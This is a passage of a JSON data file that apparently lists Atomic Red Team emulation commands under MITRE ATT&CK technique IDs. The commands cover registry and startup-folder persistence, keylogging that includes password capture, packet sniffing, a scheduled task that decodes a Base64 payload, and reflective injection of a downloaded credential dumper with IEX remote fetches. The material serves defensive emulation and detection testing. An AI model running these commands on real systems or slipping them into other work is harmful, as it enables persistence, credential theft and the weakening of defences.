            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"; cscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; cscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\""
         },
         {
            "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
            "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; set-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'"
         },
         {
            "description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
            "command": "secedit /import /db mytemplate.db /cfg \"035557_regtemplate.ini\" && secedit /configure /db mytemplate.db"
         },
         {
            "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
            "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\""
         },
         {
            "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
            "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\""
         },
         {
            "description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.\n",
            "command": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }; Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"autocheck autoche *\" -Type MultiString"
         },
         {
            "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
            "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f"
         },
         {
            "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
            "command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\""
         },
         {
            "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
            "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \", #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\""
         },
         {
            "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
            "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\""
         },
         {
            "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n",
            "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\""
         },
         {
            "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"; cscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; cscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\""
         },
         {
            "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
            "command": "$RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Set-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""
         },
         {
            "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
            "command": "$Target = \"C:\\Windows\\System32\\calc.exe\"; $ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"; $WScriptShell = New-Object -ComObject WScript.Shell; $Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()"
         },
         {
            "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
            "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \" #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\""
         },
         {
            "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
            "command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\""
         }
      ]
   },
   "T1040": {
      "technique_name": "Network Sniffing",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n",
            "command": "sudo /tmp/t1040_macos_pcapdemo -f -i en0 -t 3"
         },
         {
            "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
            "command": "sudo /tmp/t1040_macos_pcapdemo -i en0 -t 3"
         },
         {
            "description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n",
            "command": "sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3"
         },
         {
            "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
            "command": "tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33"
         },
         {
            "description": "Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.\nSets a BPF filter on the socket to filter for UDP traffic.\n",
            "command": "sudo /tmp/t1040_linux_pcapdemo -a -f -t 3"
         },
         {
            "description": "Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.\n",
            "command": "sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3"
         },
         {
            "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
            "command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl && TIMEOUT /T 5 >nul 2>&1 && pktmon.exe stop"
         },
         {
            "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n",
            "command": "sudo tcpdump -c 5 -nnni en0A    ; if [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i en0A; fi; "
         },
         {
            "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory",
            "command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10"
         },
         {
            "description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n",
            "command": "sudo /tmp/t1040_linux_pcapdemo -a -t 3"
         },
         {
            "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
            "command": "pktmon.exe filter add -p 445"
         },
         {
            "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n",
            "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet -c 5"
         },
         {
            "description": "Perform a packet capture",
            "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};\n"
         }
      ]
   },
   "T1547.007": {
      "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Copy in new loginwindow.plist to launch Calculator.\n",
            "command": "cp b1d66c_reopen_loginwindow_calc.plist ~/Library/Preferences/ByHost/com.apple.loginwindow.plist"
         },
         {
            "description": "Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.\nNote that the change may not result in the added Calculator program launching on next user login.\nIt may depend on which version of macOS you are running on.\n",
            "command": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`; if [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi; echo save backup copy to /tmp/; cp ${FILE} /tmp/t1547007_loginwindow-backup.plist; echo before; plutil -p ${FILE}; echo overwriting...; /tmp/t1547007_append_exe ${FILE} && echo after && plutil -p ${FILE}"
         },
         {
            "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n",
            "command": "sudo defaults write com.apple.loginwindow LoginHook /path/to/script"
         }
      ]
   },
   "T1056.001": {
      "technique_name": "Input Capture: Keylogging",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n",
            "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS ; auditctl -a always,exit -F arch=b32 -S execve -k CMDS; whoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\")"
         },
         {
            "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n",
            "command": "if (Test-Path \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\") { ; } else {New-Item -ItemType Directory (Split-Path \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\") -Force | Out-Null; Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\"};  ;  &\"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\" -LogPath $env:TEMP\\key.log"
         },
         {
            "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
            "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> /tmp/.keyboard.log' DEBUG; echo \"Hello World!\"; cat /tmp/.keyboard.log"
         },
         {
            "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n",
            "command": "cp -v /etc/pam.d/sshd /tmp/; echo \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd; systemctl restart sshd; systemctl restart auditd; ssh ubuntu@localhost ; whoami; sudo su; whoami; exit; exit"
         },
         {
            "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n",
            "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk; sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so; enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so; enable=* log_password\" >> /etc/pam.d/system-auth"
         },
         {
            "description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n",
            "command": "swift 8495c4_MacOSKeylogger.swift -keylog"
         },
         {
            "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
            "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'; echo \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"; tail /var/log/syslog"
         }
      ]
   },
   "T1547.004": {
      "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
            "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
         },
         {
            "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
            "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
         },
         {
            "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n",
            "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Type ExpandString -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"AtomicTestFunction\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force"
         },
         {
            "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
            "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
         },
         {
            "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
            "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
         }
      ]
   },
   "T1053.005": {
      "technique_name": "Scheduled Task/Job: Scheduled Task",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
            "command": "SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST 20:10"
         },
         {
            "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
            "command": "$xml = [System.IO.File]::ReadAllText(\"2cc1c4_T1053_005_WMI.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
         },
         {
            "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
            "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10"
         },
         {
            "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
            "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f && schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45"
         },
         {
            "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
            "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTask -InputObject $object"
         },
         {
            "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
            "command": "$xml = [System.IO.File]::ReadAllText(\"54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
         },
         {
            "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\""
         },
         {
            "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
            "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" && schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\""
         },
         {
            "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
            "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"; Set-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction"
         }
      ]
   },
   "T1055.002": {
      "technique_name": "Process Injection: Portable Executable Injection",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title \"Warning\" and the content \"Atomic Red Team\" after a few seconds.",
            "command": "Start-Process \"971b85_RedInjection.exe\"; Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
         },
         {
            "description": "Leverage Mavinject (signed binary) for DLL injection",
            "command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"
         },
         {
            "description": "Injects sandcat DLL into an available process",
            "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"
         },
         {
            "description": "Injects cred dumper exe into an available process",
            "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"
         }
      ]
   },
   "T1078.001": {
      "technique_name": "Valid Accounts: Default Accounts",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
            "command": "net user #{guest_user} /active:yes && net user #{guest_user} #{guest_password} && net localgroup #{local_admin_group} #{guest_user} /add && net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f"
         },
         {
            "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n",
            "command": "net user guest /active:yes"
         },
         {
            "description": "This test enables the guest account on macOS using sysadminctl utility.",
            "command": "sudo sysadminctl -guestAccount on"
         }
      ]
   },
   "T1484.001": {
      "technique_name": "Domain Policy Modification: Group Policy Modification",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "An adversary can modify the group policy settings.\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f && reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f"
         },
         {
            "description": "An adversary modifies group policy settings\n",
